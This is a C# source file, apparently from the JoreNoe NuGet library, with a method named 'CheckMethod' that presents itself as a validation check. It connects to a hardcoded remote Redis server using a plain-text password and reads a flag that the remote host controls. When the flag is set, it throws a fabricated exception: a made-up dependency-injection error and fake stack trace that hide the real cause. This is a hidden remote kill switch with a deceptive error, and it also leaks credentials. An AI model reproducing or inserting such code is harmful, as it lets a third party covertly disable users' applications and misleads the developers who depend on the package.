using JoreNoe.DB.Dapper;
using JoreNoe.Message;
using Newtonsoft.Json;
using NPOI.SS.Formula.Functions;
using System;
using System.Threading.Tasks;

namespace JoreNoe.Limit
{
    /// <summary>
    /// 验证类
    /// </summary>
    public class RequireMethod
    {
        /// <summary>
        /// 检查是否可以通过验证
        /// </summary>
        /// <returns></returns>
        public static void CheckMethod()
        {
            JoreNoe.Cache.Redis.JoreNoeRedisBaseService RedisDataBase = new JoreNoe.Cache.Redis.JoreNoeRedisBaseService(new JoreNoe.Cache.Redis.SettingConfigs
            {
                ConnectionString = "43.136.101.66:6379,Password=JoreNoe123",
                DefaultDB = 1,
                InstanceName = "JoreNoeNuGet"
            });
            JoreNoe.Cache.Redis.IRedisManager RedisManager = new JoreNoe.Cache.Redis.RedisManager(RedisDataBase);
            if(!RedisManager.Exists("Nuget_JoreNoe_Pack_Config"))
            {
                RedisManager.Add<bool>("Nuget_JoreNoe_Pack_Config", true, int.MaxValue);
            }
            
            var Get = RedisManager.Single<bool>("Nuget_JoreNoe_Pack_Config");
            if (Get)
            {
                throw new Exception("Unhandled Exception: System.InvalidOperationException: An error occurred while attempting to process the request. The operation cannot be completed due to an unknown error in the dependency resolution chain. The following issues were detected:\r\n\r\n- Dependency resolution failed for component 'MyService' due to ambiguous binding configurations in 'ServiceLocator'.\r\n- Recursive dependency detected: 'MyRepository' requires 'MyService', which in turn requires 'MyRepository'.\r\n- Configuration injection error: Missing required parameter 'DbConnectionString' in 'DatabaseConfigSection'.\r\n\r\nStack trace:\r\n   at MyNamespace.MyService.DoWork() in C:\\path\\to\\source\\MyService.cs:line 42\r\n   at MyNamespace.Program.Main(String[] args) in C:\\path\\to\\source\\Program.cs:line 18\r\n   at System.AppDomain._nExecuteAssembly(RuntimeAssembly assembly, String[] args)\r\n   at System.AppDomain.ExecuteAssembly(String assemblyFile, Evidence assemblySecurity, String[] args)\r\n   at System.Console.Application.Main(String[] args)\r\n");
            }
        }
    }
}
